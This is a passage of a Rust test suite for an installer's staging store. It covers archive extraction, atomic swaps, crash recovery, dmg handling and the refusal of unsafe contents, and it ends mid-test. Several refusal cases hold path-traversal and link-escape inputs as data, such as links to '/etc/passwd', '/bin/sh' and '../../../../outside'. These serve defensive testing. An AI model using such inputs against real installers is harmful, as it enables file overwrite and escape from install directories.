/// A toolchain lands in `<build>.noindex` behind its `<build>` link, and a re-stage keeps
/// that layout, replacing only the tree behind the link; a plain binary lands at its name.
#[cfg(target_os = "macos")]
#[test]
fn a_toolchain_lands_aside_in_noindex_behind_its_build_link() {
    let b = bundle_with("aside-fresh", make_toolchain_archive);
    let build = b.build();
    let aside = build.with_file_name("18.noindex");
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    assert!(is_link(&build) && is_real_dir(&aside));
    assert_eq!(std::fs::read_link(&build).unwrap(), Path::new("18.noindex"));
    assert!(crate::store::build_is_complete(&build));
    assert!(
        build
            .join("lib/rustlib/aarch64-apple-darwin/lib/libstd.rlib")
            .is_file()
    );
    assert!(scratch_beside(&build).is_empty());
    assert!(crate::store::spotlight_exposed_builds(&b.dir).is_empty());

    std::fs::write(aside.join("this-tree-survived"), b"old").unwrap();
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    assert!(is_link(&build) && is_real_dir(&aside));
    assert!(
        !aside.join("this-tree-survived").exists(),
        "the tree behind the link was replaced"
    );
    assert!(crate::store::build_is_complete(&build));
    assert!(scratch_beside(&build).is_empty());

    let plain = bundle("aside-plain");
    let (build, _) = plain.installed();
    assert!(is_real_dir(&build));
    assert!(!build.with_file_name("18.noindex").exists());
}

/// A toolchain build that is a real directory at its name comes back aside when staged
/// again, and a `<build>.noindex` no link named is taken.
#[cfg(target_os = "macos")]
#[test]
fn re_staging_a_plain_toolchain_build_lays_it_aside() {
    let b = bundle_with("aside-legacy", make_toolchain_archive);
    let build = b.build();
    let aside = build.with_file_name("18.noindex");
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    std::fs::remove_file(&build).unwrap();
    std::fs::rename(&aside, &build).unwrap();
    std::fs::write(build.join("this-tree-survived"), b"old").unwrap();
    std::fs::create_dir_all(aside.join("stray")).unwrap();
    assert!(is_real_dir(&build), "PRECONDITION: the build is plain");

    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    assert!(is_link(&build) && is_real_dir(&aside));
    assert!(!build.join("this-tree-survived").exists() && !aside.join("stray").exists());
    assert!(crate::store::build_is_complete(&build));
    assert!(scratch_beside(&build).is_empty());
}

/// The crash windows of a swap aside: the link a crash kept from being laid comes back,
/// and a tree parked off a build's link goes back behind it.
#[cfg(target_os = "macos")]
#[test]
fn a_swap_aside_killed_midway_is_put_back() {
    let b = bundle_with("aside-crash", make_toolchain_archive);
    let build = b.build();
    let aside = build.with_file_name("18.noindex");
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();

    std::fs::remove_file(&build).unwrap();
    crate::store::sweep_stage_scratch(&build);
    assert!(is_link(&build), "the aside got its link back");
    assert!(crate::store::build_is_complete(&build));

    let parked = crate::store::superseded_dir(&build).unwrap();
    crate::store::clear_build_ready(&build).unwrap();
    std::fs::rename(&aside, &parked).unwrap();
    assert!(crate::store::tree_absent(&build));
    crate::store::sweep_stage_scratch(&build);
    assert!(is_link(&build) && is_real_dir(&aside) && !parked.exists());
    assert!(build.join("bin/ay").is_file(), "the parked tree is back");
}

/// A swap over a build laid aside that fails at its last rename puts the old tree back
/// behind its link, as complete as it was.
#[cfg(target_os = "macos")]
#[test]
fn a_failed_swap_over_a_build_laid_aside_puts_it_back_behind_its_link() {
    let b = bundle_with("aside-rollback", make_toolchain_archive);
    let build = b.build();
    let aside = build.with_file_name("18.noindex");
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    std::fs::write(aside.join("this-tree-survived"), b"old").unwrap();
    let incoming = crate::store::incoming_dir(&build).unwrap();
    assert!(
        !incoming.exists(),
        "PRECONDITION: the last rename must fail"
    );

    let err = swap_into_place(&build, &incoming).unwrap_err();
    assert_eq!(err.kind(), std::io::ErrorKind::NotFound);
    assert!(is_link(&build) && is_real_dir(&aside));
    assert!(
        build.join("this-tree-survived").is_file(),
        "the same tree, back behind its link"
    );
    assert!(crate::store::build_is_complete(&build));
    assert!(scratch_beside(&build).is_empty());
}

#[test]
fn a_rollback_that_cannot_restore_the_tree_writes_no_marker() {
    let b = bundle("rollback-restore-fails");
    let build = b.build();
    std::fs::create_dir_all(build.parent().unwrap()).unwrap();
    let vanished = crate::store::superseded_dir(&build).unwrap();
    assert!(
        !vanished.exists(),
        "PRECONDITION: the tree to restore is not there, so the rename must fail"
    );

    assert!(
        !restore_outgoing(
            &vanished,
            &build,
            &build,
            true,
            &crate::store::first_exec_removal(&build).unwrap()
        ),
        "a failed restore must report itself as failed"
    );
    assert!(
        !crate::store::build_is_complete(&build),
        "a rollback that could not restore the tree must not claim it is complete"
    );
}

#[test]
fn the_armed_walk_still_catches_a_post_extraction_mutation() {
    let b = bundle("armed-mutation");
    let probe = b.dir.join("mut-probe");
    let tree = crate::extract::extract_tar_zst_tree(
        &b.archive,
        &probe,
        1 << 20,
        1000,
        ExtractOptions::default(),
        FrameChecksum::IfPresent,
    )
    .unwrap();
    let modes = tree.declared_modes();
    let fused = tree.root();
    assert_eq!(
        reverified_root(&probe, fused.clone(), true, &modes).unwrap(),
        fused
    );
    std::fs::write(probe.join("bin/ay"), b"swapped after extraction").unwrap();
    assert!(
        reverified_root(&probe, fused, true, &modes).is_err(),
        "an armed re-verify must refuse a tree mutated after the write"
    );
}

#[cfg(unix)]
use crate::extract::fixtures::{ZipMember, gzip_bytes, tar_bytes, zip_bytes};

#[cfg(unix)]
fn gh_tar() -> Vec<u8> {
    const TOP: &str = "gh_2.80.0_macOS_arm64";
    let at = |rel: &str| format!("{TOP}/{rel}");
    let (gh, alias, license, man, link) = (
        at("bin/gh"),
        at("bin/gh-alias"),
        at("LICENSE"),
        at("share/man/man1/gh.1"),
        at("bin/gh-link"),
    );
    tar_bytes(&[
        (&at(""), b'5', "", b"", 0o755),
        (&gh, b'0', "", GH, 0o755),
        (&license, b'0', "", b"MIT", 0o644),
        (&man, b'0', "", b".TH gh 1", 0o644),
        (&alias, b'1', &gh, b"", 0o755),
        (&link, b'2', "../share/man/man1/gh.1", b"", 0o777),
    ])
}

#[cfg(unix)]
const GH: &[u8] = b"#!/bin/sh\necho gh\n";

#[cfg(unix)]
fn gh_zip() -> Vec<u8> {
    let member = |name, mode, data| ZipMember {
        name,
        mode,
        data,
        deflate: true,
    };
    zip_bytes(
        &[
            member("gh_2.80.0_macOS_arm64/", 0o040_755, b""),
            member("gh_2.80.0_macOS_arm64/bin/gh", 0o100_755, GH),
            member("gh_2.80.0_macOS_arm64/LICENSE", 0o100_644, b"MIT"),
            member(
                "gh_2.80.0_macOS_arm64/share/man/man1/gh.1",
                0o100_644,
                b".TH gh 1",
            ),
            member("gh_2.80.0_macOS_arm64/bin/gh-alias", 0o100_755, GH),
            member(
                "gh_2.80.0_macOS_arm64/bin/gh-link",
                0o120_777,
                b"../share/man/man1/gh.1",
            ),
        ],
        false,
    )
}

#[cfg(unix)]
fn gh_expected_root(dir: &Path) -> String {
    let replica = dir.join("replica");
    lay(&replica, "bin/gh", GH, 0o755);
    lay(&replica, "bin/gh-alias", GH, 0o755);
    lay(&replica, "LICENSE", b"MIT", 0o644);
    lay(&replica, "share/man/man1/gh.1", b".TH gh 1", 0o644);
    lay_link(&replica, "bin/gh-link", "../share/man/man1/gh.1");
    tree_root(&replica).unwrap()
}

#[cfg(unix)]
#[test]
fn every_vendor_archive_lane_stages_with_strip_components() {
    let d = tmp("vendor-archives");
    let expected = gh_expected_root(&d);
    let zst = d.join("gh.tar.zst");
    std::fs::write(&zst, crate::extract::fixtures::zstd_bytes(&gh_tar())).unwrap();
    let gz = d.join("gh.tar.gz");
    std::fs::write(&gz, gzip_bytes(&gh_tar())).unwrap();
    let zip = d.join("gh.zip");
    std::fs::write(&zip, gh_zip()).unwrap();
    for (archive, payload) in [(&zst, "tar-zst"), (&gz, "tar-gz"), (&zip, "zip")] {
        let mut art = vendor_artifact(archive, payload, &expected);
        art.strip_components = 1;
        let build = d.join(format!("store/gh-{payload}/18"));
        verify_and_stage(&art, archive, &build, &StageHooks::NONE)
            .unwrap_or_else(|e| panic!("{payload}: {e}"));
        assert!(crate::store::build_is_complete(&build), "{payload}");
    }
}

#[cfg(unix)]
#[test]
fn raw_binary_payload_becomes_bin_entry_at_0755() {
    let d = tmp("vendor-raw");
    let payload: Vec<u8> = (0..300_000usize).map(|i| (i % 253) as u8).collect();
    let dl = d.join("claude-2.1.231-darwin-arm64");
    std::fs::write(&dl, &payload).unwrap();
    let replica = d.join("replica");
    lay(&replica, "bin/claude", &payload, 0o755);
    let plain = tree_root(&replica).unwrap();
    lay_link(&replica, "bin/claude-alias", "../bin/claude");
    let aliased = tree_root(&replica).unwrap();
    for (label, expected, alias) in [("plain", &plain, false), ("alias", &aliased, true)] {
        let mut art = vendor_artifact(&dl, "raw-binary", expected);
        art.entry = "claude".into();
        if alias {
            art.links.insert("claude-alias".into(), "bin/claude".into());
        }
        let build = d.join(format!("store/claude-{label}/2026082601"));
        verify_and_stage(&art, &dl, &build, &StageHooks::NONE)
            .unwrap_or_else(|e| panic!("{label}: {e}"));
    }
    for bad in ["", "bin/claude", "../claude", "sudo"] {
        let mut art = vendor_artifact(&dl, "raw-binary", &plain);
        art.entry = bad.into();
        let build = d.join("store/bad/1");
        let err = verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{bad:?}: {err:?}");
        assert!(!build.exists(), "{bad:?}");
    }
}

#[cfg(unix)]
#[test]
fn a_one_member_tar_gz_binary_stages_its_file_at_bin_entry_0755() {
    let d = tmp("vendor-tgzbin");
    let mut body = thin_macho();
    body.extend((0..300_000usize).map(|i| (i % 251) as u8));
    let replica = d.join("replica");
    lay(&replica, "bin/agy", &body, 0o755);
    let expected = tree_root(&replica).unwrap();
    for member_mode in [0o755, 0o644] {
        let gz = d.join(format!("agy-1.3.6-{member_mode:o}.tar.gz"));
        let tar = tar_bytes(&[("antigravity", b'0', "", &body, member_mode)]);
        std::fs::write(&gz, gzip_bytes(&tar)).unwrap();
        let mut art = vendor_artifact(&gz, "tar-gz-binary", "");
        art.entry = "agy".into();
        let asked = std::cell::RefCell::new(Vec::new());
        let verify = |path: &Path, _: std::time::Instant| {
            asked.borrow_mut().push(path.to_path_buf());
            Ok::<(), aterm_update_core::codesign::CodesignError>(())
        };
        let gate = |tree: &Path| check_developer_id(tree, "EQHXZ8M8AV", &["agy".into()], &verify);
        let hooks = StageHooks {
            pre_swap: Some(&gate),
            sidecars: None,
            aliases: &[],
            npm_package: None,
        };
        let build = d.join(format!("store/agy-{member_mode:o}/1000001000003000006"));
        let root = verify_and_stage(&art, &gz, &build, &hooks).unwrap();
        assert_eq!(root, expected, "{member_mode:o}: bin/agy at 0755");
        let asked = asked.into_inner();
        assert!(
            asked.len() == 1 && asked[0].ends_with("bin/agy"),
            "{asked:?}"
        );
    }
}

#[cfg(unix)]
#[test]
fn a_single_binary_builds_bin_is_sealed_and_every_removal_still_takes_it() {
    use std::os::unix::fs::PermissionsExt as _;
    let d = tmp("vendor-sealed");
    let layout = crate::store::Layout {
        prefix: d.to_path_buf(),
    };
    let body: Vec<u8> = (0..4096usize).map(|i| (i % 251) as u8).collect();
    let raw = d.join("agy-raw");
    std::fs::write(&raw, &body).unwrap();
    let gz = d.join("agy.tar.gz");
    let tar = tar_bytes(&[("antigravity", b'0', "", &body, 0o755)]);
    std::fs::write(&gz, gzip_bytes(&tar)).unwrap();
    let bin_mode = |build: &Path| {
        std::fs::metadata(build.join("bin"))
            .unwrap()
            .permissions()
            .mode()
            & 0o7777
    };
    for (n, (payload, dl)) in [("raw-binary", &raw), ("tar-gz-binary", &gz)]
        .into_iter()
        .enumerate()
    {
        let mut art = vendor_artifact(dl, payload, "");
        art.entry = "agy".into();
        let build = layout.build_dir("agy", n as u64 + 1);
        let root = verify_and_stage(&art, dl, &build, &StageHooks::NONE).unwrap();
        assert_eq!(bin_mode(&build), 0o555, "{payload}");
        assert_eq!(tree_root(&build).unwrap(), root, "{payload}: no root moved");
        let write = std::fs::write(build.join("bin/agy.1792104288627296000.old"), b"x");
        assert_eq!(
            write.map_err(|e| e.kind()),
            Err(std::io::ErrorKind::PermissionDenied),
            "{payload}"
        );
        verify_and_stage(&art, dl, &build, &StageHooks::NONE).unwrap();
        assert!(scratch_beside(&build).is_empty(), "{payload}");
        assert!(
            std::fs::remove_dir_all(&build).is_err(),
            "{payload}: control"
        );
        crate::store::discard_build(&build);
        assert!(!build.exists(), "{payload}: discard takes the sealed tree");
        verify_and_stage(&art, dl, &build, &StageHooks::NONE).unwrap();
    }
    crate::ops::uninstall(&layout, "agy").unwrap();
    assert!(!layout.prefix.join("store/agy").exists());
}

#[cfg(unix)]
#[test]
fn a_tar_gz_binary_that_is_not_one_root_file_is_refused() {
    use crate::extract::{ExtractError, ExtractReject as R, TooLargeReason};
    #[derive(Debug)]
    enum Refusal {
        Rejected(R, &'static str),
        ContentCap,
        Io,
    }
    let d = tmp("vendor-tgzbin-bad");
    let body = thin_macho();
    let cap = size_cap(&artifact("", ""));
    let at_cap = vec![7u8; usize::try_from(cap).unwrap()];
    let past_cap = vec![7u8; at_cap.len() + 1];
    let file = |name| (name, b'0', "", &body[..], 0o755);
    let one = gzip_bytes(&tar_bytes(&[file("antigravity")]));
    let cases = [
        (
            "two members",
            tar_bytes(&[file("antigravity"), file("LICENSE")]),
            Refusal::Rejected(R::NotSingleFile, "LICENSE"),
        ),
        (
            "a symlink",
            tar_bytes(&[("antigravity", b'2', "/bin/sh", b"", 0o777)]),
            Refusal::Rejected(R::DisallowedKind, "antigravity"),
        ),
        (
            "a hard link",
            tar_bytes(&[("antigravity", b'1', "agy", b"", 0o755)]),
            Refusal::Rejected(R::DisallowedKind, "antigravity"),
        ),
        (
            "a nested name",
            tar_bytes(&[file("dir/antigravity")]),
            Refusal::Rejected(R::NotSingleFile, "dir/antigravity"),
        ),
        (
            "a dotted name",
            tar_bytes(&[file("./antigravity")]),
            Refusal::Rejected(R::NotSingleFile, "./antigravity"),
        ),
        (
            "a backslashed name",
            tar_bytes(&[file("antigravity\\x")]),
            Refusal::Rejected(R::NotSingleFile, "antigravity\\x"),
        ),
        (
            "an empty archive",
            tar_bytes(&[]),
            Refusal::Rejected(R::NotSingleFile, ""),
        ),
        (
            "a member past the cap",
            tar_bytes(&[("antigravity", b'0', "", &past_cap, 0o755)]),
            Refusal::ContentCap,
        ),
    ]
    .map(|(label, tar, want)| (label, gzip_bytes(&tar), want))
    .into_iter()
    .chain([
        (
            "a tar that is not gzipped",
            tar_bytes(&[file("antigravity")]),
            Refusal::Io,
        ),
        (
            "a gzip cut short",
            one[..one.len() / 2].to_vec(),
            Refusal::Io,
        ),
    ]);
    for (i, (label, bytes, want)) in cases.enumerate() {
        let dl = d.join(format!("{i}.tar.gz"));
        std::fs::write(&dl, bytes).unwrap();
        let mut art = vendor_artifact(&dl, "tar-gz-binary", "");
        art.entry = "agy".into();
        let build = d.join(format!("store/agy-{i}/1"));
        let Err(StageError::Extract(e)) = verify_and_stage(&art, &dl, &build, &StageHooks::NONE)
        else {
            panic!("{label}: not an extract refusal");
        };
        let met = match (&want, &e) {
            (Refusal::Rejected(why, path), ExtractError::Rejected(r, p)) => {
                r == why && p == Path::new(path)
            }
            (Refusal::ContentCap, ExtractError::TooLarge(TooLargeReason::ContentCap))
            | (Refusal::Io, ExtractError::Io { .. }) => true,
            _ => false,
        };
        assert!(met, "{label}: want {want:?}, got {e}");
        assert!(!build.exists(), "{label}");
        assert!(scratch_beside(&build).is_empty(), "{label}");
    }
    let dl = d.join("at-cap.tar.gz");
    let tar = tar_bytes(&[("antigravity", b'0', "", &at_cap, 0o755)]);
    std::fs::write(&dl, gzip_bytes(&tar)).unwrap();
    let mut art = vendor_artifact(&dl, "tar-gz-binary", "");
    art.entry = "agy".into();
    let build = d.join("store/agy-at-cap/1");
    verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap();
    assert_eq!(std::fs::read(build.join("bin/agy")).unwrap(), at_cap);
}

#[cfg(unix)]
#[test]
fn apply_links_never_writes_through_a_staged_bin_symlink() {
    use std::os::unix::fs::PermissionsExt as _;
    let d = tmp("links-bin-symlink");
    let victim = d.join("victim");
    std::fs::create_dir_all(&victim).unwrap();
    std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o700)).unwrap();
    let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;

    let dest = d.join("direct");
    lay(&dest, "gh-real", b"#!/bin/sh\n", 0o755);
    std::os::unix::fs::symlink(&victim, dest.join("bin")).unwrap();
    let mut links = BTreeMap::new();
    links.insert("gh".to_string(), "gh-real".to_string());
    let err = apply_links(&dest, &links, None).unwrap_err();
    assert!(matches!(err, StageError::Payload(_)), "{err:?}");
    assert!(std::fs::symlink_metadata(victim.join("gh")).is_err());
    assert_eq!(
        mode(&victim),
        0o700,
        "the outside directory was not chmodded"
    );

    let dest = d.join("ancestor");
    std::fs::create_dir_all(&dest).unwrap();
    std::fs::write(victim.join("tool"), b"x").unwrap();
    std::os::unix::fs::symlink(&victim, dest.join("lib")).unwrap();
    let mut links = BTreeMap::new();
    links.insert("tool".to_string(), "lib/tool".to_string());
    let err = apply_links(&dest, &links, None).unwrap_err();
    assert!(matches!(err, StageError::Payload(_)), "{err:?}");
    assert!(std::fs::symlink_metadata(dest.join("bin/tool")).is_err());
}

#[cfg(unix)]
#[test]
fn links_lay_relative_symlinks_under_bin_and_fold_into_the_root() {
    let d = tmp("vendor-links");
    let gz = d.join("emacs.tar.gz");
    std::fs::write(
        &gz,
        gzip_bytes(&tar_bytes(&[
            (
                "Emacs.app/Contents/MacOS/Emacs",
                b'0',
                "",
                b"#!/bin/sh\necho emacs\n",
                0o755,
            ),
            (
                "Emacs.app/Contents/MacOS/bin/emacsclient",
                b'0',
                "",
                b"#!/bin/sh\necho client\n",
                0o755,
            ),
            ("bin/taken", b'0', "", b"already here", 0o644),
        ])),
    )
    .unwrap();
    let replica = d.join("replica");
    lay(
        &replica,
        "Emacs.app/Contents/MacOS/Emacs",
        b"#!/bin/sh\necho emacs\n",
        0o755,
    );
    lay(
        &replica,
        "Emacs.app/Contents/MacOS/bin/emacsclient",
        b"#!/bin/sh\necho client\n",
        0o755,
    );
    lay(&replica, "bin/taken", b"already here", 0o644);
    lay_link(&replica, "bin/emacs", "../Emacs.app/Contents/MacOS/Emacs");
    lay_link(
        &replica,
        "bin/emacsclient",
        "../Emacs.app/Contents/MacOS/bin/emacsclient",
    );
    let expected = tree_root(&replica).unwrap();

    let mut art = vendor_artifact(&gz, "tar-gz", &expected);
    art.links
        .insert("emacs".into(), "Emacs.app/Contents/MacOS/Emacs".into());
    art.links.insert(
        "emacsclient".into(),
        "Emacs.app/Contents/MacOS/bin/emacsclient".into(),
    );
    verify_and_stage(&art, &gz, &d.join("store/emacs/18"), &StageHooks::NONE).unwrap();

    let refused: &[(&str, &str, &str)] = &[
        ("dangling", "emacs", "Emacs.app/Contents/MacOS/Nope"),
        ("dotdot", "emacs", "../outside"),
        (
            "absolute",
            "emacs",
            "/Applications/Emacs.app/Contents/MacOS/Emacs",
        ),
        ("collides", "taken", "Emacs.app/Contents/MacOS/Emacs"),
        ("bad-name", "bin/emacs", "Emacs.app/Contents/MacOS/Emacs"),
    ];
    for (label, name, target) in refused {
        let mut art = vendor_artifact(&gz, "tar-gz", &expected);
        art.links.insert((*name).into(), (*target).into());
        let build = d.join(format!("store/{label}/18"));
        let err = verify_and_stage(&art, &gz, &build, &StageHooks::NONE).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{label}: {err:?}");
        assert!(!build.exists(), "{label}: nothing staged");
        assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
    }
}

#[cfg(unix)]
#[test]
fn a_staged_root_is_the_walk_of_the_tree_it_leaves_when_names_fold() {
    type Case<'a> = (
        &'a str,
        &'a [(&'a str, u8, &'a str, &'a [u8], u32)],
        &'a [(&'a str, &'a str)],
        bool,
    );
    let d = tmp("folded-names");
    let cases: &[Case<'_>] = &[
        (
            "links",
            &[("Bin/tool", b'0', "", b"#!/bin/sh\n", 0o755)],
            &[("t", "Bin/tool")],
            false,
        ),
        (
            "links-exact",
            &[("bin/tool", b'0', "", b"#!/bin/sh\n", 0o755)],
            &[("t", "bin/tool")],
            true,
        ),
    ];
    for (label, entries, links, exact) in cases {
        let gz = d.join(format!("{label}.tar.gz"));
        std::fs::write(&gz, gzip_bytes(&tar_bytes(entries))).unwrap();
        let mut art = vendor_artifact(&gz, "tar-gz", "");
        for (name, target) in *links {
            art.links.insert((*name).into(), (*target).into());
        }
        let build = d.join(format!("store/{label}/1"));
        match verify_and_stage(&art, &gz, &build, &StageHooks::NONE) {
            Ok(root) => assert_eq!(
                tree_root(&build).unwrap(),
                root,
                "{label}: the recorded root is the installed tree's"
            ),
            Err(StageError::Extract(ExtractError::Rejected(
                crate::extract::ExtractReject::Occupied,
                _,
            ))) if !exact => {
                assert!(!build.exists(), "{label}: nothing staged");
                assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
            }
            Err(e) => panic!("{label}: {e:?}"),
        }
    }
}

#[cfg(target_os = "macos")]
#[test]
fn a_failed_attach_is_reclaimed_and_retried_until_the_attempts_run_out() {
    let (mut armed, mut tried, mut reclaimed) = (0u32, 0u32, Vec::new());
    let r = attach_retrying(
        || {
            armed += 1;
            armed
        },
        |m| {
            tried += 1;
            match m {
                1 => Err(StageError::Payload(String::from(
                    "hdiutil failed: Resource temporarily unavailable",
                ))),
                _ => Ok(()),
            }
        },
        |m| reclaimed.push(m),
    );
    assert!(matches!(r, Ok(2)), "the second guard attached: {r:?}");
    assert_eq!(tried, 2, "no attempt after the one that attached");
    assert_eq!(reclaimed, [1], "the failed attempt's guard was reclaimed");

    let (mut armed, mut reclaimed) = (0u32, Vec::new());
    let r = attach_retrying(
        || {
            armed += 1;
            armed
        },
        |m| Err(StageError::Payload(format!("attempt {m}"))),
        |m| reclaimed.push(m),
    );
    assert!(
        matches!(&r, Err(StageError::Payload(s)) if *s == format!("attempt {ATTACH_ATTEMPTS}")),
        "the last attempt's error: {r:?}"
    );
    assert_eq!(
        reclaimed,
        (1..=ATTACH_ATTEMPTS).collect::<Vec<_>>(),
        "every failed guard was reclaimed"
    );
}

#[cfg(target_os = "macos")]
#[test]
fn a_failed_attach_leaves_a_carcass_the_hdiutil_report_names() {
    const REPORT: &str = "framework       : 683.160.3
driver          : 683.160.3
images          : 3
================================================
image-path      : /Users//someone/Downloads/aterm-0.81.0.dmg
image-alias     : /Users//someone/Downloads/aterm-0.81.0.dmg
image-type      : read-only disk image
/dev/disk4\tGUID_partition_scheme\t
/dev/disk4s1\t48465300-0000-11AA-AA11-00306543ECAC\t/Volumes/aterm 0.81.0
================================================
image-path      : /tmp/stage/foo.dmg
image-alias     : /tmp/stage/foo.dmg
image-type      : UDIF read-only [write once]
/dev/disk5\tGUID_partition_scheme\t
/dev/disk5s1\t7C3457EF-0000-11AA-AA11-00306543ECAC\t
/dev/disk6\tEF57347C-0000-11AA-AA11-00306543ECAC\t
/dev/disk6s1\t41504653-0000-11AA-AA11-00306543ECAC\t
================================================
image-path      : /tmp/stage/bar.dmg
image-alias     : /tmp/stage/bar.dmg
/dev/disk7\tGUID_partition_scheme\t
/dev/disk7s1\t41504653-0000-11AA-AA11-00306543ECAC\t/tmp/stage/bar.mnt
";
    let all = parse_hdiutil_info(REPORT);
    assert_eq!(all.len(), 3, "one entry per attached image");
    assert_eq!(all[0].node, Path::new("/dev/disk4"));
    assert_eq!(
        all[0].mounted_at,
        vec![PathBuf::from("/Volumes/aterm 0.81.0")],
        "a mount point may hold spaces; the fields are tab-separated"
    );
    assert_eq!(
        all[1].node,
        Path::new("/dev/disk5"),
        "the image's OWN node, not the synthesised APFS container's"
    );
    assert!(
        all[1].mounted_at.is_empty(),
        "the carcass is attached and mounted nowhere: {:?}",
        all[1].mounted_at
    );

    let mine = |image: &str, point: &str| Mount {
        image: PathBuf::from(image),
        point: PathBuf::from(point),
        attached: false,
    };
    assert_eq!(
        mine("/tmp/stage/foo.dmg", "/tmp/stage/foo.mnt").reclaimable(REPORT),
        vec![PathBuf::from("/dev/disk5")],
        "the carcass of OUR image is ours to eject"
    );
    assert_eq!(
        mine("/tmp/stage/bar.dmg", "/tmp/stage/bar.mnt").reclaimable(REPORT),
        vec![PathBuf::from("/dev/disk7")],
        "so is an image mounted at our own mount point"
    );
    assert!(
        mine(
            "/Users//someone/Downloads/aterm-0.81.0.dmg",
            "/tmp/stage/x.mnt"
        )
        .reclaimable(REPORT)
        .is_empty(),
        "an image the user has mounted elsewhere is NOT ours to yank"
    );
    assert!(
        mine("/tmp/stage/other.dmg", "/tmp/stage/other.mnt")
            .reclaimable(REPORT)
            .is_empty(),
        "an image we never attached is never touched"
    );
}

#[cfg(target_os = "macos")]
fn stand_in_bytes(_src: &Path, image: &Path) -> std::io::Result<()> {
    std::fs::write(image, b"a scratch folder stands in for this image")
}

#[cfg(target_os = "macos")]
struct StandIn {
    root: PathBuf,
    log: std::rc::Rc<std::cell::RefCell<Vec<&'static str>>>,
    released: bool,
}

#[cfg(target_os = "macos")]
impl Attached for StandIn {
    fn root(&self) -> &Path {
        &self.root
    }

    fn detach(&mut self) -> Result<(), StageError> {
        self.released = true;
        self.log.borrow_mut().push("detach");
        Ok(())
    }
}

#[cfg(target_os = "macos")]
impl Drop for StandIn {
    fn drop(&mut self) {
        if !self.released {
            self.log.borrow_mut().push("dropped");
        }
    }
}

#[cfg(target_os = "macos")]
fn standing_in<R>(root: &Path, f: impl FnOnce() -> R) -> (R, Vec<&'static str>) {
    let log = std::rc::Rc::new(std::cell::RefCell::new(Vec::new()));
    let (root, arm_log) = (root.to_path_buf(), std::rc::Rc::clone(&log));
    let out = image_arm::with(
        Box::new(move |_, _| {
            arm_log.borrow_mut().push("attach");
            Ok(Box::new(StandIn {
                root: root.clone(),
                log: std::rc::Rc::clone(&arm_log),
                released: false,
            }))
        }),
        f,
    );
    let events = log.borrow().clone();
    (out, events)
}

#[cfg(target_os = "macos")]
#[test]
fn dmg_app_payload_stages_the_single_app_and_its_links() {
    let d = tmp("vendor-dmg");
    let (src, dmg) = (d.join("src"), d.join("foo.dmg"));
    let art = foo_app_image(&d, &src, &dmg, stand_in_bytes).unwrap();
    let build = d.join("store/foo/2026082601");
    let (staged, events) = standing_in(&src, || {
        verify_and_stage(&art, &dmg, &build, &StageHooks::NONE)
    });
    staged.unwrap();
    assert!(
        !has_acl(&build.join("Foo.app/Contents/Resources/acl")),
        "no ACL on the image reaches the store"
    );
    assert_eq!(events, ["attach", "detach"], "released once, explicitly");
}

#[cfg(target_os = "macos")]
#[test]
fn a_dmg_with_no_app_is_refused_and_detached() {
    let d = tmp("vendor-dmg-none");
    let src = d.join("src-none");
    lay(&src, "README.txt", b"r", 0o644);
    let dmg = d.join("none.dmg");
    stand_in_bytes(&src, &dmg).unwrap();
    let art = vendor_artifact(&dmg, "dmg", &tree_root(&src).unwrap());
    let build = d.join("store/none/1");
    let (staged, events) = standing_in(&src, || {
        verify_and_stage(&art, &dmg, &build, &StageHooks::NONE)
    });
    let err = staged.unwrap_err();
    assert!(matches!(err, StageError::DmgAppCount(0)), "{err:?}");
    assert!(!build.exists());
    assert!(scratch_beside(&build).is_empty());
    assert_eq!(events, ["attach", "dropped"], "released on the error path");
}

#[cfg(target_os = "macos")]
#[test]
fn a_dmg_whose_bundle_links_out_is_refused_naming_the_link_and_released() {
    let d = tmp("vendor-dmg-escape");
    let src = d.join("src-escape");
    lay(
        &src,
        "Bad.app/Contents/MacOS/x",
        b"#!/bin/sh\nexit 0\n",
        0o755,
    );
    lay_link(
        &src,
        "Bad.app/Contents/Resources/out",
        "../../../../outside",
    );
    let dmg = d.join("escape.dmg");
    stand_in_bytes(&src, &dmg).unwrap();
    let art = vendor_artifact(&dmg, "dmg", &tree_root(&src).unwrap());
    let build = d.join("store/escape/1");
    let (staged, events) = standing_in(&src, || {
        verify_and_stage(&art, &dmg, &build, &StageHooks::NONE)
    });
    match staged {
        Err(StageError::Extract(ExtractError::Rejected(_, link))) => {
            assert_eq!(link, Path::new("Bad.app/Contents/Resources/out"));
        }
        other => panic!("the vet refuses the link: {other:?}"),
    }
    assert!(!build.exists());
    assert!(scratch_beside(&build).is_empty());
    assert!(
        matches!(events.as_slice(), ["attach", "detach" | "dropped"]),
        "released exactly once: {events:?}"
    );
}

#[cfg(target_os = "macos")]
#[test]
fn dmg_picker_refuses_anything_but_exactly_one_real_app() {
    let d = tmp("dmg-picker");
    let one = d.join("one");
    lay(&one, "Foo.app/Contents/MacOS/foo", b"x", 0o755);
    lay(&one, "README.txt", b"r", 0o644);
    lay_link(&one, "Applications", "/Applications");
    lay_link(&one, "Alias.app", "Foo.app");
    assert_eq!(single_app_in(&one).unwrap(), one.join("Foo.app"));

    for (label, apps) in [("two", &["A.app", "B.app"][..]), ("none", &[][..])] {
        let root = d.join(label);
        for app in apps {
            lay(&root, &format!("{app}/Contents/MacOS/x"), b"x", 0o755);
        }
        lay(&root, "README.txt", b"r", 0o644);
        let err = single_app_in(&root).unwrap_err();
        assert!(
            matches!(err, StageError::DmgAppCount(count) if count == apps.len()),
            "{label}: {err:?}"
        );
    }
}

#[cfg(target_os = "macos")]
#[test]
fn dmg_link_vet_admits_an_in_root_climb_and_refuses_an_escape() {
    let d = tmp("dmg-link-vet");
    for (label, target, ok) in [
        ("up-link", "../../../../outside", false),
        ("in-root-link", "../../Bad.app/Contents/MacOS/x", true),
        ("abs-link", "/etc/passwd", false),
    ] {
